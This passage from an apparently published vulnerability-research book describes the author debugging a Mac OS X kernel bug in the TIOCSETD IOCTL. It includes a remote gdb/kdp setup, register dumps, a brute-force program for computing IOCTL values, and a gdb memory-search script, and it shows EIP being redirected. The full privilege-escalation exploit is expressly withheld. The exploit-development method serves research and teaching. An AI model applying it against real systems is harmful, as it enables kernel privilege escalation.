64 bytes from 10.0.0.2: icmp_seq=1 ttl=64 time=1.08 ms

--- 10.0.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% loss, time 0ms
rtt min/avg/max/mdev = 1.082/1.082/1.082/0.000 ms</pre><p>I added a permanent ARP entry for the target on the Linux system to establish a robust connection between the two machines, ensuring that the connection wouldn’t be dropped while the kernel of the target machine was being debugged:</p><a id="I_programlisting7_d1e8231"/><pre class="programlisting">linux$ <strong class="userinput"><code>su -</code></strong>
Password:

linux# <strong class="userinput"><code>arp -an</code></strong>
? (10.0.0.1) at 00:24:E8:A8:64:DA [ether] on eth0
? (10.0.0.2) at 00:17:F2:F0:47:19 [ether] on eth0

linux# <strong class="userinput"><code>arp -s 10.0.0.2 00:17:F2:F0:47:19</code></strong>

linux# <strong class="userinput"><code>arp -an</code></strong>
? (10.0.0.1) at 00:24:E8:A8:64:DA [ether] on eth0
? (10.0.0.2) at 00:17:F2:F0:47:19 [ether] <strong class="userinput"><code>PERM</code></strong> on eth0</pre><p>I then logged in to the Mac OS X system as an unprivileged user and generated a nonmaskable interrupt (NMI) by tapping the system’s power button. That gave me the following output on the screen of the MacBook:</p><a id="I_programlisting7_d1e8250"/><pre class="programlisting">Debugger called: &lt;Button SCI&gt;
Debugger called: &lt;Button SCI&gt;
cpu_interrupt: sending enter debugger signal (00000002) to cpu 1
ethernet MAC address: 00:17:f2:f0:47:19
ethernet MAC address: 00:17:f2:f0:47:19
ip address: 10.0.0.2
ip address: 10.0.0.2

Waiting for remote debugger connection.</pre><p>Back on the Linux host, I started the kernel debugger (see Section B.5 for more information on how to build this gdb version):</p><a id="I_programlisting7_d1e8255"/><pre class="programlisting">linux# <strong class="userinput"><code>gdb_osx KernelDebugKit_10.4.8/mach_kernel</code></strong>
GNU gdb 2003-01-28-cvs (Mon Mar  5 16:54:25 UTC 2007)
Copyright 2003 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for details.
This GDB was configured as "--host= --target=i386-apple-darwin".</pre><p>I then instructed the debugger to use Apple’s kernel debug protocol (kdp):</p><a id="I_programlisting7_d1e8262"/><pre class="programlisting">(gdb) <strong class="userinput"><code>target remote-kdp</code></strong></pre><p>Once the debugger was running, I attached to the kernel of the target system for the first time:</p><a id="I_programlisting7_d1e8268"/><pre class="programlisting">(gdb) <strong class="userinput"><code>attach 10.0.0.2</code></strong>
Connected.
0x001a8733 in lapic_dump () at /SourceCache/xnu/xnu-792.13.8/osfmk/i386/mp.c:332
332             int     i;</pre><p>As the debugger output shows, it seemed to work! The OS X system was frozen at that time, so I continued the execution of the kernel with the following debugger command:</p><a id="I_programlisting7_d1e8275"/><pre class="programlisting">(gdb) <strong class="userinput"><code>continue</code></strong>
Continuing.</pre><p>Now everything was set up for remotely debugging the kernel of the Mac OS X target system.</p></div><div class="sect2" title="Step 4: Get Control over EIP"><div class="titlepage"><div><div><h2 class="title"><a id="step_4_colon_get_control_over_eip"/>Step 4: Get Control over EIP</h2></div></div></div><p>After I had successfully connected the debugger to the kernel of the target system, I opened a terminal on the Mac OS X machine and again executed the POC code described in <a class="xref" href="ch07s02.html#poc_code_open_parenthesis-id1" title="Example 7-2. POC code (poc.c) I wrote to trigger the bug I found in the kernel of OS X">Example 7-2</a>:</p><a id="I_programlisting7_d1e8289"/><pre class="programlisting">osx$ <strong class="userinput"><code>id</code></strong>
uid=502(seraph) gid=502(seraph) groups=502(seraph)

osx$ <strong class="userinput"><code>./poc</code></strong></pre><p>The OS X system froze immediately, and I got the following debugger output on the Linux host:<a id="IDX-CHP-7-0017" class="indexterm"/></p><a id="I_programlisting7_d1e8301"/><pre class="programlisting">Program received signal SIGTRAP, Trace/breakpoint trap.
0x0035574c in ttsetcompat (tp=0x37e0804, com=0x8004741b,
 data=0x2522beb8 "",                     → term=0x3)
 at /SourceCache/xnu/xnu-792.13.8/bsd/kern/tty_compat.c:145
145      */</pre><p>To see what exactly caused the <code class="literal">SIGTRAP</code> signal, I looked at the last executed kernel instruction (see Section B.4 for a description of the following debugger commands):</p><a id="I_programlisting7_d1e8308"/><pre class="programlisting">(gdb) <strong class="userinput"><code>x/1i $eip</code></strong>
0x35574c &lt;ttsetcompat+138&gt;:     call   *0x456860(%eax)</pre><p>Apparently, the crash occurred when the kernel tried to call an address referenced by the <code class="literal">EAX</code> register. Next, I looked at the register values:</p><a id="I_programlisting7_d1e8318"/><pre class="programlisting">(gdb) <strong class="userinput"><code>info registers</code></strong>
<strong class="userinput"><code>eax            0xe0000000</code></strong>       −536870912
ecx            0x4000001        67108865
edx            0x386c380        59163520
ebx            0xff000000       −16777216
esp            0x2522bc18       0x2522bc18
ebp            0x2522bd18       0x2522bd18
esi            0x37e0804        58591236
edi            0x0              0
eip            0x35574c         0x35574c
eflags         0x10287          66183
cs             0x8              8
ss             0x10             16
ds             0x4b0010         4915216
es             0x340010         3407888
fs             0x25220010       622985232
gs             0x48             72</pre><p>The debugger output shows that <code class="literal">EAX</code> had a value of <code class="literal">0xe0000000</code>. It wasn’t apparent to me where this value came from, so I disassembled the instructions around <code class="literal">EIP</code>:</p><a id="I_programlisting7_d1e8337"/><pre class="programlisting">(gdb) <strong class="userinput"><code>x/6i $eip - 15</code></strong>
<strong class="userinput"><code>0x35573d &lt;ttsetcompat+123&gt;:     mov    %ebx,%eax</code></strong>
<strong class="userinput"><code>0x35573f &lt;ttsetcompat+125&gt;:     shl    $0x5,%eax</code></strong>
0x355742 &lt;ttsetcompat+128&gt;:     mov    %esi,0x4(%esp,1)
0x355746 &lt;ttsetcompat+132&gt;:     mov    0xffffffa8(%ebp),%ecx
0x355749 &lt;ttsetcompat+135&gt;:     mov    %ecx,(%esp,1)
<strong class="userinput"><code>0x35574c &lt;ttsetcompat+138&gt;:     call   *0x456860(%eax)</code></strong></pre><div class="note" title="Note"><h3 class="title">Note</h3><p><span class="emphasis"><em>Note that the disassembly is in AT&amp;T style</em></span>.<a id="IDX-CHP-7-0018" class="indexterm"/></p></div><p>At address <code class="literal">0x35573d</code>, the value of <code class="literal">EBX</code> is copied into <code class="literal">EAX</code>. The next instruction modifies this value by a left shift of 5 bits. At address <code class="literal">0x35574c</code>, the value is used to calculate the operand of the <code class="literal">call</code> instruction. So where did the value of <code class="literal">EBX</code> come from? A quick look at the register values revealed that <code class="literal">EBX</code> was holding the value <code class="literal">0xff000000</code>, the value I had supplied as input data for the <code class="literal">TIOCSETD</code> IOCTL. The value <code class="literal">0xe0000000</code> was the result of a left shift of my supplied input value by 5 bits. As expected, I was able to control the memory location used to find the new value for the <code class="literal">EIP</code> register. The modification of my supplied input data can be expressed as<a id="IDX-CHP-7-0019" class="indexterm"/></p><a id="I_programlisting7_d1e8401"/><pre class="programlisting">address of the new value for EIP = (IOCTL input data value &lt;&lt; 5) + 0x456860</pre><p>I could get an appropriate <code class="literal">TIOCSETD</code> input data value for a specific memory address in either of two ways: I could try to solve the mathematical problem, or I could brute force the value. I decided to go with the easy option and wrote the following program to brute force the value:</p><div class="example"><a id="code_that_i_wrote_to_brute_force_the"/><p class="title">Example 7-3. Code that I wrote to brute force the <code class="literal">TIOCSETD</code> input data value (<span class="emphasis"><em>addr_brute_force.c</em></span>)</p><div class="example-contents"><pre class="programlisting">01    #include &lt;stdio.h&gt;
02
03    #define MEMLOC          0x10203040
04    #define SEARCH_START    0x80000000
05    #define SEARCH_END      0xffffffff
06
07    int
08    main (void)
09    {
10       unsigned int    a, b = 0;
11
12       for (a = SEARCH_START; a &lt; SEARCH_END; a++) {
13           b = (a &lt;&lt; 5) + 0x456860;
14           if (b == MEMLOC) {
15               printf ("Value: %08x\n", a);
16               return 0;
17           }
18       }
19
20       printf ("No valid value found.\n");
21
22       return 1;
23    }</pre></div></div><p>I wrote this program to answer this question: What <code class="literal">TIOCSETD</code> input data do I have to send to the kernel in order to get the value at memory address <code class="literal">0x10203040</code> copied into the <code class="literal">EIP</code> register?</p><a id="I_programlisting7_d1e8430"/><pre class="programlisting">osx$ <strong class="userinput"><code>gcc -o addr_brute_force addr_brute_force.c</code></strong>
osx$ <strong class="userinput"><code>./addr_brute_force</code></strong>
Value: 807ed63f</pre><p>If <code class="literal">0x10203040</code> pointed to the value I wanted copied into <code class="literal">EIP</code>, I had to supply the value <code class="literal">0x807ed63f</code> as an input for the <code class="literal">TIOCSETD</code> IOCTL.</p><p>I then tried to manipulate <code class="literal">EIP</code> to make it point to address <code class="literal">0x65656565</code>. To achieve this, I had to find a memory location in the kernel that pointed to that value. To find suitable memory locations in the kernel, I wrote the following gdb script:</p><div class="example"><a id="a_script_for_finding_memory_locations"/><p class="title">Example 7-4. A script for finding memory locations in the kernel that point to a special byte pattern (<span class="emphasis"><em>search_memloc.gdb</em></span>)</p><div class="example-contents"><pre class="programlisting">01    set $MAX_ADDR = 0x00600000
02
03    define my_ascii
04      if $argc != 1
05        printf "ERROR: my_ascii"
06      else
07        set $tmp = *(unsigned char *)($arg0)
08        if ($tmp &lt; 0x20 || $tmp &gt; 0x7E)
09          printf "."
10        else
11          printf "%c", $tmp
12        end
13      end
14    end
15
16    define my_hex
17      if $argc != 1
18        printf "ERROR: my_hex"
19      else
20        printf "%02X%02X%02X%02X ", \
21          *(unsigned char*)($arg0 + 3), *(unsigned char*)($arg0 + 2),     \
22          *(unsigned char*)($arg0 + 1), *(unsigned char*)($arg0 + 0)
23      end
24    end
25
26    define hexdump
27      if $argc != 2
28        printf "ERROR: hexdump"
29      else
30        if ((*(unsigned char*)($arg0 + 0) == (unsigned char)($arg1 &gt;&gt;  0)))
31          if ((*(unsigned char*)($arg0 + 1) == (unsigned char)($arg1 &gt;&gt;  8)))
32            if ((*(unsigned char*)($arg0 + 2) == (unsigned char)($arg1 &gt;&gt; 16)))
33              if ((*(unsigned char*)($arg0 + 3) == (unsigned char)($arg1 &gt;&gt; 24)))
34                printf "%08X : ", $arg0
35                my_hex $arg0
36                my_ascii $arg0+0x3
37                my_ascii $arg0+0x2
38                my_ascii $arg0+0x1
39                my_ascii $arg0+0x0
40                printf "\n"
41              end
42            end
43          end
44        end
45      end
46    end
47
48    define search_memloc
49      set $max_addr = $MAX_ADDR
50      set $counter = 0
51      if $argc != 2
52        help search_memloc
53      else
54        while (($arg0 + $counter) &lt;= $max_addr)
55          set $addr = $arg0 + $counter
56          hexdump $addr $arg1
57          set $counter = $counter + 0x20
58        end
59      end
60    end
61    document search_memloc
62    Search a kernel memory location that points to PATTERN.
63    Usage: search_memloc ADDRESS PATTERN
64    ADDRESS - address to start the search
65    PATTERN - pattern to search for
66    end</pre></div></div><p>The gdb script from <a class="xref" href="ch07s02.html#a_script_for_finding_memory_locations" title="Example 7-4. A script for finding memory locations in the kernel that point to a special byte pattern (search_memloc.gdb)">Example 7-4</a> takes two arguments: the address from where to start the search and the pattern to search for. I wanted to find a memory location that pointed to the value <code class="literal">0x65656565</code>, so I used the script in the following way:</p><a id="I_programlisting7_d1e8476"/><pre class="programlisting">(gdb) <strong class="userinput"><code>source search_memloc.gdb</code></strong>
(gdb) <strong class="userinput"><code>search_memloc 0x400000 0x65656565</code></strong>
0041BDA0 : 65656565 eeee
0041BDC0 : 65656565 eeee
0041BDE0 : 65656565 eeee
0041BE00 : 65656565 eeee
0041BE20 : 65656565 eeee
0041BE40 : 65656565 eeee
0041BE60 : 65656565 eeee
0041BE80 : 65656565 eeee
0041BEA0 : 65656565 eeee
0041BEC0 : 65656565 eeee
00459A00 : 65656565 eeee
00459A20 : 65656565 eeee
00459A40 : 65656565 eeee
00459A60 : 65656565 eeee
00459A80 : 65656565 eeee
00459AA0 : 65656565 eeee
00459AC0 : 65656565 eeee
00459AE0 : 65656565 eeee
00459B00 : 65656565 eeee
00459B20 : 65656565 eeee
Cannot access memory at address 0x4dc000</pre><p>The output shows the memory locations found by the script that point to the value <code class="literal">0x65656565</code>. I picked the first one from the list, adjusted the <code class="literal">MEMLOC</code> defined in line 3 of <a class="xref" href="ch07s02.html#code_that_i_wrote_to_brute_force_the" title="Example 7-3. Code that I wrote to brute force the TIOCSETD input data value (addr_brute_force.c)">Example 7-3</a>, and let the program determine the appropriate <code class="literal">TIOCSETD</code> input value:</p><a id="I_programlisting7_d1e8497"/><pre class="programlisting">osx$ <strong class="userinput"><code>head −3 addr_brute_force.c</code></strong>
#include &lt;stdio.h&gt;

#define MEMLOC    <strong class="userinput"><code>0x0041bda0</code></strong>

osx$ <strong class="userinput"><code>gcc -o addr_brute_force addr_brute_force.c</code></strong>

osx$ <strong class="userinput"><code>./addr_brute_force</code></strong>
Value: 87ffe2aa</pre><p>I then changed the IOCTL input value in the POC code illustrated in <a class="xref" href="ch07s02.html#poc_code_open_parenthesis-id1" title="Example 7-2. POC code (poc.c) I wrote to trigger the bug I found in the kernel of OS X">Example 7-2</a>, connected the kernel debugger to OS X, and executed the code:</p><a id="I_programlisting7_d1e8515"/><pre class="programlisting">osx$ <strong class="userinput"><code>head −6 poc.c</code></strong>
#include &lt;sys/ioctl.h&gt;

int
main (void)
{
      unsigned long     ldisc = <strong class="userinput"><code>0x87ffe2aa</code></strong>;

osx$ <strong class="userinput"><code>gcc -o poc poc.c</code></strong>

osx$ <strong class="userinput"><code>./poc</code></strong></pre><p>The OS X machine froze again, and the debugger on the Linux host displayed the following output:</p><a id="I_programlisting7_d1e8530"/><pre class="programlisting">Program received signal SIGTRAP, Trace/breakpoint trap.
<strong class="userinput"><code>0x65656565 in ?? ()</code></strong>

(gdb) <strong class="userinput"><code>info registers</code></strong>
eax            0xfffc5540       −240320
ecx            0x4000001        67108865
edx            0x386c380        59163520
ebx            0x87ffe2aa       −2013273430
esp            0x250dbc08       0x250dbc08
ebp            0x250dbd18       0x250dbd18
esi            0x3e59604        65377796
edi            0x0              0
<strong class="userinput"><code>eip            0x65656565       0x65656565</code></strong>
eflags         0x10282          66178
cs             0x8              8
ss             0x10             16
ds             0x3e50010        65339408
es             0x3e50010        65339408
fs             0x10             16
gs             0x48             72</pre><p>As the debugger output shows, the <code class="literal">EIP</code> register now had a value of <code class="literal">0x65656565</code>. At this point I was able to control <code class="literal">EIP</code>, but exploiting the bug to achieve arbitrary code execution at the kernel level was still a challenge. Under OS X, including Leopard, the kernel isn’t mapped into every user space process; it has its own virtual address space. It’s therefore impossible to return to a user space address using common strategies for Linux or Windows. I solved this problem by heap spraying the kernel with my privilege escalation payload and a reference to this payload. I achieved this by exploiting a memory leak in the kernel of OS X. Then I calculated an appropriate <code class="literal">TIOCSETD</code> input value that pointed to the payload reference. This value was then copied into <code class="literal">EIP</code> and . . . bingo!<a id="IDX-CHP-7-0020" class="indexterm"/><a id="IDX-CHP-7-0021" class="indexterm"/><a id="IDX-CHP-7-0022" class="indexterm"/><a id="IDX-CHP-7-0023" class="indexterm"/><a id="IDX-CHP-7-0024" class="indexterm"/></p><p>Providing you with a full working exploit would be against the law, but if you are interested, you can watch a short video I recorded that shows the exploit in action on the book’s website.<sup>[<a href="ch07s05.html#ftn.CHP-7-FN-4" class="footnoteref">78</a>]</sup></p></div></div></body></html>
